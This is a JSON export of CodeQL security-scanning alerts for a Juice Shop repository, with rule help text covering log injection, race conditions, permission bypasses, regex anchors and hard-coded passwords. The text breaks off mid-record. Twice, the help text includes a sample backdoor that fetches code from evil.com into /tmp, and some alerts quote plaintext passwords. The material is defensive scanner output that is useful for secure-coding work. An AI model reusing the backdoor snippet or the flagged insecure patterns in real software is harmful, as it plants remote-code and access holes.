[{"number":121,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/121","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/121","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/log-injection","severity":"error","description":"Log injection","name":"js/log-injection","tags":["external/cwe/cwe-117","security"],"full_description":"Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.","help":"# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Log entry depends on a user-provided value."},"location":{"path":"lib/challengeUtils.ts","start_line":85,"end_line":85,"start_column":15,"end_column":62},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/121/instances","dismissal_approved_by":null},{"number":120,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/120","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/120","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/http-to-file-access","severity":"warning","description":"Network data written to file","name":"js/http-to-file-access","tags":["external/cwe/cwe-434","external/cwe/cwe-912","security"],"full_description":"Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.","help":"# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Write to file system depends on Untrusted data."},"location":{"path":"routes/profileImageFileUpload.ts","start_line":31,"end_line":31,"start_column":26,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/120/instances","dismissal_approved_by":null},{"number":119,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/119","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/119","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/http-to-file-access","severity":"warning","description":"Network data written to file","name":"js/http-to-file-access","tags":["external/cwe/cwe-434","external/cwe/cwe-912","security"],"full_description":"Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.","help":"# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Write to file system depends on Untrusted data."},"location":{"path":"routes/fileUpload.ts","start_line":32,"end_line":32,"start_column":22,"end_column":28},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/119/instances","dismissal_approved_by":null},{"number":118,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/118","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/118","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-system-race","severity":"warning","description":"Potential file system race condition","name":"js/file-system-race","tags":["external/cwe/cwe-367","security"],"full_description":"Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.","help":"# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The file may have changed since it was checked."},"location":{"path":"lib/codingChallenges.ts","start_line":29,"end_line":29,"start_column":28,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/118/instances","dismissal_approved_by":null},{"number":117,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/117","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/117","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"routes/verify.ts","start_line":113,"end_line":113,"start_column":7,"end_column":12},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/117/instances","dismissal_approved_by":null},{"number":116,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/116","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/116","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"routes/fileServer.ts","start_line":27,"end_line":27,"start_column":9,"end_column":13},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/116/instances","dismissal_approved_by":null},{"number":115,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/115","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/115","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"lib/insecurity.ts","start_line":190,"end_line":190,"start_column":7,"end_column":12},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/115/instances","dismissal_approved_by":null},{"number":114,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/114","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/114","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"lib/insecurity.ts","start_line":57,"end_line":57,"start_column":42,"end_column":47},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/114/instances","dismissal_approved_by":null},{"number":113,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/113","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/113","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/regex/missing-regexp-anchor","severity":"warning","description":"Missing regular expression anchor","name":"js/regex/missing-regexp-anchor","tags":["correctness","external/cwe/cwe-020","security"],"full_description":"Regular expressions without anchors can be vulnerable to bypassing.","help":"# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.match(/https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nThe check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // GOOD: the host of `url` can not be controlled by an attacker\n    if (url.match(/^https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nA related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\\.example\\.com|beta\\.example\\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\\.example\\.com)|(beta\\.example\\.com)/`\n\n\n## References\n* MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"When this is used as a regular expression on a URL, it may match anywhere, and arbitrary hosts may come before or after it."},"location":{"path":"test/cypress/e2e/redirect.spec.ts","start_line":19,"end_line":19,"start_column":32,"end_column":54},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/113/instances","dismissal_approved_by":null},{"number":112,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/112","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/112","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'private' in configuration file."},"location":{"path":"data/static/users.yml","start_line":259,"end_line":259,"start_column":13,"end_column":22},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/112/instances","dismissal_approved_by":null},{"number":111,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/111","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/111","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'ship coffin krypt cross estate supply insurance asbestos souvenir' in configuration file."},"location":{"path":"data/static/users.yml","start_line":249,"end_line":249,"start_column":13,"end_column":80},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/111/instances","dismissal_approved_by":null},{"number":110,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/110","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/110","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: 